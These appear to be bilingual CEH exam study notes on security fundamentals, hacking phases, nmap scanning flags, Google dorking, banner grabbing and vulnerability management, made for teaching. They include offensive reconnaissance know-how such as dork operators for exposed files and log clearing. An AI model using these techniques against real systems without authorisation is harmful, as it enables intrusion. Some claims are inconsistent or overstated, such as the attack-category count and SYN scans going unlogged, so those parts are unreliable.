# 🛡️ Module 1: Introduction to Information Security & Hacking Basics

### ১. Element of Information Security ★★★
* **English Definition:** Information security elements are the foundational pillars designed to protect data and information systems from unauthorized access, use, disclosure, disruption, modification, or destruction.
* **The 5 Core Elements (Security Pentagon):**
  1. **Confidentiality:** Assures that information is accessible only to authorized users and protected from unauthorized disclosure (Defense: AES/RSA Encryption, ACLs, MFA).
  2. **Integrity:** Guarantees the trustworthiness, accuracy, and completeness of information by preventing unauthorized modification or tampering (Defense: Hashing algorithms like SHA-256, Digital Signatures, FIM).
  3. **Availability:** Ensures authorized users have uninterrupted and timely access to systems and data whenever needed (Defense: Redundancy, RAID, High Availability, Load Balancers, DDoS mitigation).
  4. **Authenticity:** Verifies that the identity of the user, device, or source of communication is genuine and verified (Defense: PKI, SSL/TLS Certificates, Biometrics).
  5. **Non-Repudiation:** Ensures that a sender or receiver cannot deny having performed a transaction or sent a message (Defense: Digital Signatures, Immutable Audit Logs, RFC 3161 Timestamping).

### ২. CIA Triangle (CIA Triad) ★★★
* **সংজ্ঞা:** তথ্যের নিরাপত্তার ক্লাসিক্যাল মডেল যা ৩টি মূল স্তম্ভের ওপর প্রতিষ্ঠিত।
```
              [ Confidentiality ]
                     /   \
                    /     \
                   /  CIA  \
                  /  Triad  \
    [ Availability ] ------- [ Integrity ]
```
* **১. Confidentiality (গোপনীয়তা):** সংবেদনশীল ডেটা কেবল অনুমতিপ্রাপ্ত ব্যক্তি দেখতে পারবে (যেমন: ক্রেডিট কার্ড নম্বর এনক্রিপ্ট রাখা)।
* **২. Integrity (নির্ভুলতা):** ডেটা ট্রানজিটে বা স্টোরেজে কেউ পরিবর্তন করেনি (যেমন: SHA-256 হ্যাশ ম্যাচ করা)।
* **৩. Availability (সহজলভ্যতা):** সিস্টেম ২৪/৭ চালু থাকবে (যেমন: ক্লাউড ব্যাকআপ, ফেইলওভার সার্ভার)।
* **পরীক্ষার জন্য গুরুত্বপূর্ণ পয়েন্ট:** Security, Usability এবং Functionality-এর ভারসাম্য বজায় রেখে CIA নিশ্চিত করতে হয়।

### ৩. Security Pentagon ★★★
* **সংজ্ঞা:** আধুনিক সাইবার নিরাপত্তা ও CEH ফ্রেমওয়ার্কে CIA ট্রায়াডের সাথে **Authenticity** এবং **Non-Repudiation** যুক্ত করে ৫টি কোণবিশিষ্ট যে মডেল তৈরি হয়, তাকে Security Pentagon বলা হয়।
```
                 [ Authenticity ]
                      /\
                     /  \
     [ Confidentiality ] [ Integrity ]
            \              /
             \            /
       [ Availability ]-[ Non-Repudiation ]
```
* **CIA vs Pentagon:** CIA ট্রায়াড কেবল ডেটার গোপনীয়তা, নির্ভুলতা ও প্রাপ্যতা নিশ্চিত করে; কিন্তু লেনদেনের উৎস আসল কি না (Authenticity) এবং কাজ শেষে তা অস্বীকার করা বন্ধ করা (Non-Repudiation) নিশ্চিত করতে Security Pentagon অপরিহার্য।

### ৪. Hacker Definition, Types of Hackers & Attack Components ★★
* **Hacker Definition:** যে ব্যক্তি কম্পিউটার সিস্টেম, নেটওয়ার্ক বা সফটওয়্যারের অভ্যন্তরীণ কার্যপ্রণালী গভীরভাবে জেনে সিস্টেমের দুর্বলতা (vulnerabilities) খুঁজে বের করে বা সিস্টেমে অননুমোদিত প্রবেশ লাভ করে।
* **Types of Hackers:**
  1. **White Hat Hackers:** নৈতিক হ্যাকার (Ethical Hackers) যারা অনুমোদিতভাবে (with permission) নিরাপত্তার ফাঁকফোকর খুঁজে ঠিক করতে কাজ করে।
  2. **Black Hat Hackers:** সাইবার অপরাধী যারা ব্যক্তিগত স্বার্থ বা আর্থিক লাভের জন্য অসদুপায়ে সিস্টেমে আক্রমণ করে ক্ষতিসাধন করে।
  3. **Grey Hat Hackers:** অনুমতি ছাড়া সিস্টেমে ঢোকে কিন্তু সাধারণত ক্ষতিকর উদ্দেশ্যে নয়; পরে বাউন্টি বা ফি দাবি করে দুর্বলতা প্রকাশ করে।
  4. **Suicide Hackers:** যারা ধরা পড়া বা জেল-জরিমানার ভয় না করেই প্রতিশোধ বা ধ্বংসযজ্ঞের জন্য হামলা চালায়।
  5. **Script Kiddies:** অভিজ্ঞতাহীন নবিশ যারা অন্যের লেখা রেডিমেড টুলস ও স্ক্রিপ্ট ব্যবহার করে কোনো গভীর জ্ঞান ছাড়াই আক্রমণ চালায়।
  6. **Hacktivists:** রাজনৈতিক, সামাজিক বা ধর্মীয় মতাদর্শ প্রচারের উদ্দেশ্যে ওয়েবসাইট ডিফেস বা ডেটা লিক করে (যেমন: Anonymous)।
  7. **State-Sponsored Hackers:** কোনো দেশের সরকার কর্তৃক পরিচালিত উচ্চ প্রশিক্ষিত দল যারা অন্য দেশের জাতীয় পরিকাঠামো বা গোপন তথ্যে হামলা করে।
* **Essential Components of an Attack:**
  $$\text{Attack} = \text{Motive (Goal)} + \text{Method (Tools/Techniques)} + \text{Vulnerability (Flaw)}$$
  * **Motive:** আক্রমণের উদ্দেশ্য (অর্থ, প্রতিশোধ, রাজনৈতিক ইত্যাদি)।
  * **Method:** আক্রমণ চালানোর পথ বা এক্সপ্লয়েট কৌশল।
  * **Vulnerability:** সিস্টেম বা সফটওয়্যারের নিরাপত্তার ত্রুটি বা দুর্বলতা।

### ৫. Classification of Attacks ★★★
CEH কারিকুলাম অনুসারে আক্রমণগুলোকে প্রধানত ৪টি শ্রেণীতে ভাগ করা হয়:
1. **Passive Attacks:** সিস্টেমের কোনো ক্ষতি না করে শুধুমাত্র গোপনে নেটওয়ার্ক ট্রাফিক বা তথ্য নজরদারি করা।
   * *উদাহরণ:* Sniffing, Eavesdropping, Footprinting, Wiretapping।
   * *শনাক্তকরণ:* অত্যন্ত কঠিন, কারণ সিস্টেমে কোনো পরিবর্তন আসে না।
2. **Active Attacks:** সিস্টেমে সরাসরি হস্তক্ষেপ করে ডেটা পরিবর্তন, সিস্টেম ডাউন বা এক্সেস দখল করা।
   * *উদাহরণ:* DoS/DDoS, SQL Injection, Session Hijacking, Man-in-the-Middle (MitM)।
3. **Close-in Attacks (Physical Attacks):** লক্ষ্যবস্তু বা ডিভাইসের শারীরিক নৈকট্যে গিয়ে আক্রমণ পরিচালনা করা।
   * *উদাহরণ:* Shoulder Surfing, Dumpster Diving, Rogue AP বা BadUSB প্লাগ করা।
4. **Insider Attacks:** প্রতিষ্ঠানের ভেতরকার কোনো অনুমোদিত কর্মী বা প্রিভিলেজড ইউজারের মাধ্যমে ক্ষতিসাধন বা ডেটা চুরি।
5. **Distribution Attacks:** সফটওয়্যার বা হার্ডওয়্যার ফ্যাক্টরি থেকে গ্রাহকের কাছে পৌঁছানোর পথে (Supply Chain) ম্যালওয়্যার যুক্ত করে দেওয়া।

### ৬. APT (Advanced Persistent Threat) ★★
* **সংজ্ঞা:** APT হলো অত্যন্ত সুসংগঠিত, দক্ষ এবং সুনির্দিষ্ট লক্ষ্যভিত্তিক (targeted) দীর্ঘমেয়াদী সাইবার আক্রমণ, যা সাধারণত রাষ্ট্রীয় পৃষ্ঠপোষকতায় (State-sponsored) বা বড় সাইবার অপরাধী চক্র দ্বারা পরিচালিত হয়।
* **মূল বৈশিষ্ট্য:**
  * **Advanced:** কাস্টম জিরো-ডে (0-day) এক্সপ্লয়েট এবং অত্যাধুনিক স্টেলথ টুলস ব্যবহার করে।
  * **Persistent:** লক্ষ্যবস্তুর নেটওয়ার্কে বছরের পর বছর গোপনে অবস্থান করে নজরদারি চালায়।
  * **Threat:** এদের আক্রমণ কোনো নির্দিষ্ট ব্যক্তিকে নয়, বরং জাতীয় নিরাপত্তা বা মেগা এন্টারপ্রাইজকে টার্গেট করে।
* **APT Lifecycle / Phases:**
  1. *Initial Compromise:* Spear phishing বা সাপ্লাই চেইন দ্বারা নেটওয়ার্কে ঢোকা।
  2. *Establish Foothold:* ব্যাকডোর ইনস্টল করা।
  3. *Escalate Privileges:* ডোমেন অ্যাডমিন অধিকার অর্জন।
  4. *Internal Reconnaissance:* অভ্যন্তরীণ নেটওয়ার্ক ম্যাপ করা।
  5. *Lateral Movement:* এক সার্ভার থেকে অন্য সার্ভারে বিস্তার।
  6. *Maintain Presence:* দীর্ঘমেয়াদী এক্সেস বজায় রাখা।
  7. *Data Exfiltration:* গোপন ডেটা নিরাপদে বাইরে পাচার করা।

### ১. Ethical Hacking Framework (The 6/7 Phases) ★★★★
পরীক্ষার জন্য এটি অন্যতম সর্বোচ্চ গুরুত্বপূর্ণ প্রশ্ন। হ্যাকিং ও পেনিট্রেশন টেস্টিংয়ের সার্বিক ফ্রেমওয়ার্ক নিচে দেওয়া হলো:
```
[ 1. Reconnaissance ] ➔ [ 2. Scanning ] ➔ [ 3. Enumeration ] ➔ [ 4. Vulnerability Analysis ]
                                                                           │
[ 7. Clearing Tracks ] 🠔 [ 6. Maintaining Access ] 🠔 [ 5. Gaining Access ] 🠔
```
1. **Reconnaissance (তথ্য সংগ্রহ):** টার্গেটের বিরুদ্ধে নিষ্ক্রিয় বা সক্রিয়ভাবে তথ্য যোগাড় করা (Passive/Active Recon)।
2. **Scanning (নেটওয়ার্ক স্ক্যানিং):** নেটওয়ার্কে কোন কোন হোস্ট চালু আছে, কোন কোন পোর্ট খোলা এবং কোন সার্ভিস চলছে তা বের করা (`nmap`, `netdiscover`)।
3. **Enumeration (এনিউমারেশন):** উন্মুক্ত পোর্ট ও সার্ভিস থেকে ইউজারনেম, শেয়ার ফোল্ডার, রাউটিং টেবিল ইত্যাদি সুনির্দিষ্ট তথ্য বের করা (`enum4linux`, `snmpwalk`)।
4. **Vulnerability Analysis (দুর্বলতা নিরূপণ):** চিহ্নিত সার্ভিসগুলোতে কোনো পরিচিত দুর্বলতা বা মিসকনফিগারেশন আছে কি না তা মূল্যায়ন করা (Nessus, OpenVAS, NVD)।
5. **Gaining Access (এক্সেস দখল):** দুর্বলতা কাজে লাগিয়ে (Exploitation) টার্গেট সিস্টেমে শেল বা এক্সেস নেওয়া (Metasploit, Reverse Shell)।
6. **Maintaining Access (এক্সেস টিকিয়ে রাখা):** রিবুট বা প্যাচিং হলেও যাতে প্রবেশাধিকার বজায় থাকে সেজন্য ব্যাকডোর, ট্রোজান বা রুটকিট স্থাপন করা।
7. **Clearing Tracks (চিহ্ন মুছে ফেলা):** আক্রমণের কোনো প্রমাণ না রাখতে সিস্টেম লগ মুছে ফেলা (`clearev`), অডিট লগ বন্ধ করা বা টাইমস্ট্যাম্প পরিবর্তন করা।

### ২. Cyber Kill Chain Method ★★★
* **উৎস:** লকহিড মার্টিন (Lockheed Martin) কর্তৃক উদ্ভাবিত একটি মডেল যা কোনো সাইবার হামলার প্রতিটি ধাপ চিহ্নিত ও প্রতিহত করতে ব্যবহৃত হয়।
* **ধাপ ৭টি (ক্রমানুসারে মুখস্থ রাখতে হবে):**
  1. **Reconnaissance:** টার্গেটের দুর্বলতা ও তথ্য সংগ্রহ (LinkedIn, DNS, পোর্ট স্ক্যান)।
  2. **Weaponization:** কোনো এক্সপ্লয়েটকে পেলোডের (যেমন: ম্যালিসিয়াস PDF বা Macro Excel) সাথে যুক্ত করে অস্ত্র তৈরি করা।
  3. **Delivery:** ইমেইল ফিশিং বা ওয়েবসাইটের মাধ্যমে টার্গেটের কাছে পেলোড পাঠানো।
  4. **Exploitation:** শিকার পেলোড রান করা মাত্রই সফটওয়্যার দুর্বলতাকে কাজে লাগিয়ে কোড এক্সিকিউট করা।
  5. **Installation:** সিস্টেমে ম্যালওয়্যার বা ব্যাকডোর স্থায়ীভাবে ইনস্টল হওয়া।
  6. **Command and Control (C2):** আক্রান্ত সিস্টেম বহিরাগত হ্যাকারের C2 সার্ভারের সাথে এনক্রিপ্টেড সংযোগ স্থাপন করা।
  7. **Actions on Objectives:** চূড়ান্ত লক্ষ্য পূরণ (যেমন: ডেটা চুরি, সিস্টেম র‍্যানসমওয়্যারে এনক্রিপ্ট করা, ধ্বংসযজ্ঞ)।

### ৩. Cyber Threat Intelligence (CTI): Definition + Life Cycle ★★★
* **CTI Definition:** সাইবার আক্রমণকারীদের পরিচয়, উদ্দেশ্য, সক্ষমতা এবং আক্রমণের ধরণ (TTPs) সম্পর্কিত প্রমাণ-ভিত্তিক জ্ঞান ও তথ্য যা সম্ভাব্য ঝুঁকি কমাতে সাহায্য করে।
* **CTI Life Cycle (৬টি ধাপ):**
  1. **Planning & Direction:** কোন কোন হুমকির তথ্য সংগ্রহ করতে হবে তার লক্ষ্য ও প্রশ্নের পরিধি নির্ধারণ।
  2. **Collection:** বিভিন্ন সোর্স (OSINT, ডার্ক ওয়েব ফোরাম, সিকিউরিটি লগ, সিগনাল ইন্টেলিজেন্স) থেকে ডেটা যোগাড় করা।
  3. **Processing:** অসংগঠিত কাঁচা ডেটাকে সাজানো, ফিল্টার করা এবং ডিক্রিপ্ট করা।
  4. **Analysis:** ডেটা বিশ্লেষণ করে বাস্তবায়নযোগ্য ইন্টেলিজেন্সে রূপান্তর করা।
  5. **Dissemination:** তৈরি রিপোর্ট সংশ্লিষ্ট দল বা ডিসিশন মেকারদের কাছে পাঠানো।
  6. **Feedback:** প্রাপ্ত ফলের ভিত্তিতে পরবর্তী চক্রের উন্নয়ন করা।

### ৫. Risk Management & Firewall Risk Mitigation ★★★
* **Risk Formula:** 
  $$\text{Risk} = \text{Threat (হুমকি)} \times \text{Vulnerability (দুর্বলতা)} \times \text{Impact (প্রভাব)}$$
* **Firewall Risk Mitigation (ফায়ারওয়ালের ঝুঁকি কমানোর কৌশল):**
  * **Default Deny Rule:** যা কিছু বিশেষভাবে অনুমোদিত নয়, সবকিছু ব্লক করা (`Deny All by default`)।
  * **Ingress ও Egress ফিল্টারিং:** ইনকামিং ট্রাফিকের পাশাপাশি আক্রান্ত হোস্ট বাইরে যোগাযোগ করছে কি না তা দেখতে আউটগোয়িং ট্রাফিক কঠোরভাবে নিয়ন্ত্রণ।
  * **Stateful Inspection:** কেবল পোর্ট নয়, সেশনের বৈধ হ্যান্ডশেক স্টেট মনিটর করা।
  * **নিয়মিত রুল অডিট:** অপ্রয়োজনীয় ও পুরোনো ওপেন পোর্ট বা রুল অপসারণ করা।

# 🔍 Module 3: Footprinting & Reconnaissance (Information Gathering)

---

### ১. What is Footprinting & Types of Reconnaissance? ★★★
* **Footprinting:** টার্গেট প্রতিষ্ঠান বা সিস্টেমের নেটওয়ার্ক রেঞ্জ, ডোমেন নাম, সার্ভার টেকনোলজি, কর্মী তালিকা ইত্যাদি প্রাথমিক তথ্য নিয়মমাফিকভাবে যোগাড় করার প্রক্রিয়া।
* **Types of Reconnaissance:**
  1. **Passive Reconnaissance:** টার্গেট সিস্টেমের সাথে সরাসরি কোনো যোগাযোগ না করে পাবলিকলি উপলব্ধ উৎস থেকে তথ্য সংগ্রহ করা। টার্গেট কখনো বুঝতে পারে না যে তথ্য নেওয়া হচ্ছে।
     * *টুলস:* Google Dorking, Whois, Netcraft, LinkedIn, Shodan, Wayback Machine।
  2. **Active Reconnaissance:** সরাসরি টার্গেট সার্ভার বা আইপিতে প্যাকেট বা প্রোব পাঠিয়ে তথ্য নেওয়া। এতে টার্গেটের IDS/IPS বা ফায়ারওয়ালে লগ তৈরি হয়।
     * *টুলস:* `nmap`, `ping`, `nslookup`, `telnet`, `nikto`।

---

### ২. Google Dorking (Google Hacking Database - GHDB)
* **Google Dorking:** গুগলের অ্যাডভান্সড সার্চ অপারেটর ব্যবহার করে ইন্টারনেটে উন্মুক্ত কনফিগারেশন ফাইল, পাসওয়ার্ড লগ, ক্যামেরা বা দুর্বল সার্ভার খুঁজে বের করা।
* **মূল অপারেটরসমূহ:**
  * `site:` — নির্দিষ্ট ডোমেনে সীমাবদ্ধ রাখা (যেমন: `site:hackersacademy.com`)
  * `filetype:` — ফাইলের এক্সটেনশন খোঁজা (যেমন: `filetype:pdf`, `filetype:env`, `filetype:sql`)
  * `inurl:` — URL-এর ভেতরে নির্দিষ্ট শব্দ খোঁজা (যেমন: `inurl:admin.php`, `inurl:login`)
  * `intitle:` — ওয়েব পেজের টাইটেলে খোঁজা (যেমন: `intitle:"index of /"`)
* **GHDB:** Offensive Security পরিচালিত একটি উন্মুক্ত রিপোজিটরি যেখানে হাজার হাজার কার্যকরী গুগল ডর্ক সংরক্ষিত থাকে।

### ৩. Competitive Intelligence Gathering
* **সংজ্ঞা:** কোনো প্রতিদ্বন্দ্বী কোম্পানি বা প্রতিষ্ঠানের ব্যবসায়িক পরিকল্পনা, ব্যবহৃত প্রযুক্তি স্ট্যাক, পার্টনারশিপ ও কর্মীবাহিনীর তথ্য নীতিগতভাবে পাবলিক সোর্স থেকে বিশ্লেষণ করা।
* **উৎস:** কোম্পানির জব পোস্টিং (যেখানে চাকরির বর্ণনায় কোন সার্ভার বা ফায়ারওয়াল ব্যবহার করে তা লেখা থাকে), SEC/EDGAR ফাইলিং, পেটেন্ট ডেটাবেস, সোশ্যাল মিডিয়া।

# 🌐 Module 4: Network & Protocols Foundation

---

### ১. OSI Reference Model ★★
আন্তর্জাতিক সংস্থা ISO কর্তৃক প্রণীত ৭টি স্তরের নেটওয়ার্ক মডেল:
| লেয়ার নম্বর | লেয়ারের নাম | PDU (Data Unit) | মূল প্রোটোকল ও নিরাপত্তা ব্যবস্থা |
|---|---|---|---|
| **Layer 7** | Application | Data | HTTP, HTTPS, FTP, DNS, SMTP, WAF |
| **Layer 6** | Presentation | Data | SSL/TLS, JPEG, ASCII (এনক্রিপশন ও কম্প্রেশন) |
| **Layer 5** | Session | Data | NetBIOS, RPC, PPTP (সেশন ম্যানেজমেন্ট) |
| **Layer 4** | Transport | Segment | TCP, UDP (SSL/TLS, পোর্ট সিকিউরিটি) |
| **Layer 3** | Network | Packet | IP, ICMP, IPsec, Router, ফায়ারওয়াল |
| **Layer 2** | Data Link | Frame | Ethernet, MAC, Switch, ARP Inspection |
| **Layer 1** | Physical | Bits | হাব, ক্যাবল, ফিজিক্যাল ওয়্যারিং, সিগন্যাল |

---

### ২. TCP Flags Explained ★★★
TCP হেডার-এ ৬টি মূল ফ্ল্যাগ থাকে (Control Bits) যা প্যাকেট ট্রান্সমিশনের অবস্থা নির্দেশ করে:
1. **SYN (Synchronize):** সংযোগ স্থাপনের সূচনা করতে হ্যান্ডশেক শুরুর প্রথম প্যাকেট।
2. **ACK (Acknowledgment):** কোনো প্যাকেট সফলভাবে গ্রহণের প্রাপ্তিস্বীকার বা কনফার্মেশন।
3. **FIN (Finish):** স্বাভাবিক ও নিয়মমাফিক উপায়ে সংযোগ বন্ধের প্রস্তাব।
4. **RST (Reset):** কোনো অবৈধ প্যাকেট এলে বা জোরপূর্বক তাৎক্ষণিক সংযোগ কেটে দিতে ব্যবহৃত হয় (পোর্ট বন্ধ থাকলে ক্লোজড পোর্ট RST পাঠায়)।
5. **PSH (Push):** বাফারে অপেক্ষা না করে ডেটা অবিলম্বে অ্যাপ্লিকেশন লেয়ারে পাঠিয়ে দেওয়ার নির্দেশ।
6. **URG (Urgent):** প্যাকেটের নির্দিষ্ট ডেটা অত্যন্ত জরুরি ভিত্তিতে প্রসেস করার নির্দেশ।

---

### ৩. TCP 3-Way Handshake ★★★★
পরীক্ষার অন্যতম প্রিয় প্রশ্ন। নির্ভরযোগ্য TCP সংযোগ স্থাপনের ৩টি ধাপ:
```
Client (অ্যাটাকার/ইউজার)                       Server (টার্গেট)
       |                                              |
       |  ---- Step 1: [SYN, Seq = x] ------------->  | (ক্লায়েন্ট কানেকশন রিকোয়েস্ট পাঠায়)
       |                                              |
       |  <--- Step 2: [SYN+ACK, Seq = y, Ack = x+1]  | (সার্ভার গ্রহণ করে এবং নিজের SYN পাঠায়)
       |                                              |
       |  ---- Step 3: [ACK, Seq = x+1, Ack = y+1] -> | (ক্লায়েন্ট কনফার্ম করে, সংযোগ সম্পন্ন)
       v                                              v
```
* **Half-Open Attack (SYN Flood):** ক্লায়েন্ট Step 1 এ SYN পাঠায়, সার্ভার Step 2 এ SYN-ACK দিয়ে বাফার রিজার্ভ করে অপেক্ষা করে; কিন্তু ক্লায়েন্ট কখনো Step 3 এর চূড়ান্ত ACK পাঠায় না। ফলে সার্ভারের মেমোরি পূর্ণ হয়ে সার্ভার ক্র্যাশ করে (DoS attack)।

# 📡 Module 5: Scanning & Host Discovery

---

### ১. What is Scanning & Types of Scanning ★★★
* **Scanning:** রিকনেসান্সের পরবর্তী ধাপ, যেখানে নেটওয়ার্কে সক্রিয় হোস্ট, ওপেন পোর্ট এবং তাদের সার্ভিস ভার্সন সক্রিয়ভাবে শনাক্ত করা হয়।
* **স্ক্যানিংয়ের ৩টি প্রকারভেদ:**
  1. **Network Scanning:** সাবনেটের মধ্যে কোন কোন আইপি বা হোস্ট চালু আছে তা বের করা (Ping Sweep)।
  2. **Port Scanning:** কোনো টার্গেট আইপির কোন কোন TCP/UDP পোর্ট খোলা আছে তা জানা।
  3. **Vulnerability Scanning:** ওপেন পোর্টের সার্ভিসে কোনো পরিচিত ত্রুটি বা CVE আছে কি না তা অটোমেটেড স্ক্যানারের মাধ্যমে যাচাই করা।

---

### ২. Network Scanning Objectives ★★★
1. সক্রিয় হোস্ট শনাক্ত করা (Discover live hosts on network)।
2. উন্মুক্ত পোর্ট খুঁজে বের করা (Identify open, closed, or filtered ports)।
3. অপারেটিং সিস্টেম ও এর ভার্সন শনাক্ত করা (OS fingerprinting)।
4. চলমান সার্ভিস ও সফটওয়্যার ভার্সন জানা (Service and Version detection)।
5. সিস্টেমের দুর্বলতা ও মিসকনফিগারেশন চিহ্নিত করা।

---

### ৩. Host Discovery Techniques
* **ARP Ping (`-PR`):** লোকাল নেটওয়ার্কে সবচেয়ে দ্রুত ও নির্ভুল (ফায়ারওয়াল ব্লক করতে পারে না)।
* **ICMP Echo Ping (`-PE`):** সাধারণ পিং প্যাকেট পাঠানো (অনেক ফায়ারওয়ালে ব্লক থাকে)।
* **TCP SYN Ping (`-PS`):** পোর্ট ৮০ বা ৪৪৩ এ SYN পাঠিয়ে হোস্টের উপস্থিতি নিশ্চিত করা।
* **UDP Ping (`-PU`):** বন্ধ পোর্টে UDP পাঠিয়ে ICMP Port Unreachable উত্তরের মাধ্যমে হোস্ট শনাক্ত করা।
* **No Ping (`-Pn`):** পিং পরীক্ষা বাদ দিয়ে সরাসরি প্রতিটি হোস্টকে জীবন্ত ধরে স্ক্যান করা।

---

### ৪. Port and Service Discovery Techniques (Nmap Flags)
* **TCP Connect Scan (`-sT`):** পূর্ণ ৩-ওয়ে হ্যান্ডশেক সম্পন্ন করে। নির্ভুল কিন্তু টার্গেট লগে ধরা পড়ে যায়।
* **SYN Stealth Scan (`-sS`):** ডিফল্ট ও সবচেয়ে জনপ্রিয়। কেবল SYN পাঠায়, SYN-ACK পেলে তাৎক্ষণিক RST পাঠিয়ে হ্যান্ডশেক ভেঙে ফেলে; সংযোগ পূর্ণ হয় না বলে লগে রেকর্ড হয় না।
* **UDP Scan (`-sU`):** UDP পোর্ট (DNS 53, SNMP 161) স্ক্যান করার জন্য। ধীরগতির।
* **Version Detection (`-sV`):** পোর্টে চলা সার্ভিসের সফটওয়্যার ভার্সন (যেমন: Apache 2.4.49) প্রকাশ করে।
* **OS Detection (`-O`):** TCP/IP স্ট্যাক ফিঙ্গারপ্রিন্টিংয়ের মাধ্যমে অপারেটিং সিস্টেম চিনে নেয়।

# 🔢 Module 6: Enumeration & Banner Grabbing

---

### ১. What is Enumeration and its Activities? ★
* **Enumeration:** স্ক্যানিংয়ে প্রাপ্ত ওপেন সার্ভিসগুলোর সাথে সরাসরি সক্রিয় সংযোগ তৈরি করে সুনির্দিষ্ট তথ্য (যেমন: ইউজার একাউন্ট, শেয়ার ফোল্ডার, রাউটিং টেবিল) সংগ্রহের প্রক্রিয়া।
* **Enumeration Activities:**
  * নেটওয়ার্ক শেয়ার ও ফোল্ডারের নাম জানা (SMB shares)।
  * ব্যবহারকারী ও গ্রুপের তালিকা তৈরি (User/Group names)।
  * রাউটিং টেবিল ও মেশিন নাম বের করা।
  * DNS জোন ট্রান্সফার (AXFR) টেস্ট করা।
  * SNMP কমিউনিটি স্ট্রিং বের করে পুরো নেটওয়ার্ক তথ্য ডাউনলোড করা।

---

### ২. The Purpose of Enumeration ★★
* স্ক্যানিং শুধু জানায় পোর্ট খোলা আছে কি না; আর এনিউমারেশন জানায় ভেতরে ঠিক কী চলছে এবং কার কার ইউজার আইডি আছে।
* এটি স্ক্যানিং এবং সরাসরি সিস্টেমে অননুমোদিত প্রবেশের (Gaining Access / Exploitation) মধ্যকার সেতুবন্ধন।

---

### ৩. OS Discovery and Banner Grabbing
* **Banner Grabbing:** কোনো পোর্টের সার্ভিসে রিমোটলি কানেক্ট করে অ্যাপ্লিকেশন বা অপারেটিং সিস্টেমের যে ওয়েলকাম মেসেজ বা হেডার ফিরে আসে তা দেখে সার্ভিস ও ওএস ভার্সন জানা।
* **ধরন:**
  * **Active Banner Grabbing:** `telnet`, `netcat` বা `curl -I` দিয়ে সরাসরি রিকোয়েস্ট পাঠিয়ে ব্যানার সংগ্রহ করা।
  * **Passive Banner Grabbing:** Wireshark দিয়ে ক্যাপচার করা প্যাকেটের TTL (Time to Live) এবং TCP Window Size পরীক্ষা করে ওএস অনুমান করা (যেমন: লিনাক্সের TTL সাধারণত ৬৪, উইন্ডোজের ১২৮)।

# ⚠️ Module 7: Vulnerability Assessment & Management

---

### ১. Steps of Vulnerability Management Life Cycle ★★★★
পরীক্ষার অন্যতম ৪-স্টার প্রশ্ন। সাইকেলটির ৬টি ধাপ ধারাবাহিকভাবে মনে রাখতে হবে:
```
[ 1. Discover ] ➔ [ 2. Prioritize Assets ] ➔ [ 3. Assess ]
       🠕                                            │
[ 6. Report & Audit ] 🠔 [ 5. Verify / Rescan ] 🠔 [ 4. Remediate ]
```
1. **Discover (আবিষ্কার):** নেটওয়ার্কে থাকা সমস্ত আইটি সম্পদ (সার্ভার, পিসি, রাউটার) ইনভেন্টরিতে তালিকাভুক্ত করা।
2. **Prioritize Assets (অগ্রাধিকার নির্ধারণ):** ব্যবসার জন্য কোন এসেটটি সবচেয়ে বেশি গুরুত্বপূর্ণ (যেমন: ডেটাবেস সার্ভার বনাম টেস্ট মেশিন) তা বিন্যাস করা।
3. **Assess (মূল্যায়ন):** অটোমেটেড ভালনারেবিলিটি স্ক্যানার দিয়ে ত্রুটি ও ঝুঁকির মাত্রা পরিমাপ করা।
4. **Remediate (সমাধান):** ত্রুটি দূর করতে সিকিউরিটি প্যাচ প্রয়োগ করা, কনফিগারেশন ঠিক করা বা অপ্রয়োজনীয় সার্ভিস বন্ধ করা।
5. **Verify (যাচাইকরণ):** পুনরায় স্ক্যান (Rescan) চালিয়ে নিশ্চিত হওয়া যে প্যাচটি সঠিকভাবে কাজ করেছে এবং ত্রুটি দূর হয়েছে।
6. **Report (প্রতিবেদন তৈরি):** ম্যানেজমেন্ট এবং টেকনিক্যাল টিমের জন্য বিস্তারিত ঝুঁকি ও সমাধানের অডিট রিপোর্ট প্রকাশ করা।

---

### ২. CVSS Scoring System (Common Vulnerability Scoring System)
* **CVSS:** যেকোনো সিকিউরিটি দুর্বলতার তীব্রতা (Severity) পরিমাপ করার বিশ্বজনীন আন্তর্জাতিক স্ট্যান্ডার্ড (ভার্সন: CVSS v3.1 ও v4.0, নিয়ন্ত্রণ করে FIRST.org)।
* **স্কোর রেঞ্জ ও সিভিয়ারিটি রেটিং:**
  * `0.0` : None
  * `0.1 – 3.9` : Low
  * `4.0 – 6.9` : Medium
  * `7.0 – 8.9` : **High**
  * `9.0 – 10.0` : **Critical**
* **CVSS এর ৩টি মেট্রিক গ্রুপ:**
  1. **Base Metric Group:** অন্তর্নিহিত বৈশিষ্ট্য যা সময় বা পরিবেশের সাথে বদলায় না (Attack Vector, Attack Complexity, Privileges Required, Impact on CIA)।
  2. **Temporal Metric Group:** সময়ের সাথে পরিবর্তিত বৈশিষ্ট্য (Exploit Code Maturity, Remediation Level)।
  3. **Environmental Metric Group:** নির্দিষ্ট প্রতিষ্ঠানের লোকাল নেটওয়ার্ক পরিবেশ অনুযায়ী স্কোর।

---

### ৩. CVE & NVD Database ★★
* **CVE (Common Vulnerabilities and Exposures):** বিশ্বব্যাপী প্রতিটি সিকিউরিটি দুর্বলতার জন্য তৈরি একটি ইউনিক পরিচিতি আইডি (যেমন: `CVE-2017-0144` — EternalBlue)। এটি পরিচালনা করে MITRE।
* **NVD (National Vulnerability Database):** মার্কিন সরকারের NIST কর্তৃক পরিচালিত ডাটাবেস যা CVE এন্ট্রির সাথে বিস্তারিত বিশ্লেষণ, CVSS স্কোর, ফিক্স এবং প্যাচের লিঙ্ক সরবরাহ করে।

---

### ৪. What is CIS Benchmark?
* **CIS (Center for Internet Security):** একটি আন্তর্জাতিক অলাভজনক সংস্থা যা আইটি সিস্টেম সুরক্ষার জন্য ইন্ডাস্ট্রি-স্বীকৃত কনফিগারেশন বেসলাইন এবং নির্দেশিকা প্রদান করে।
* **CIS Benchmark:** অপারেটিং সিস্টেম (উইন্ডোজ, লিনাক্স), ক্লাউড বা নেটওয়ার্ক ডিভাইস হার্ডেনিং করার জন্য ধাপে ধাপে নির্দেশিকা (যেমন: পরপর ৫ বার ভুল পাসওয়ার্ড দিলে একাউন্ট লক করা, অডিট লগ সক্রিয় করা, অপ্রয়োজনীয় প্রোটোকল যেমন SMBv1 বা Telnet নিষ্ক্রিয় করা)।

### ১. Metasploit Framework: Definition & Module Types ★★★
* **সংজ্ঞা:** Metasploit হলো একটি বহুল ব্যবহৃত ওপেন সোর্স পেনিট্রেশন টেস্টিং ফ্রেমওয়ার্ক, যার মাধ্যমে সিস্টেমের দুর্বলতা যাচাই, এক্সপ্লয়েট কোড রান এবং পেলোড ডেলিভারি করা হয়।
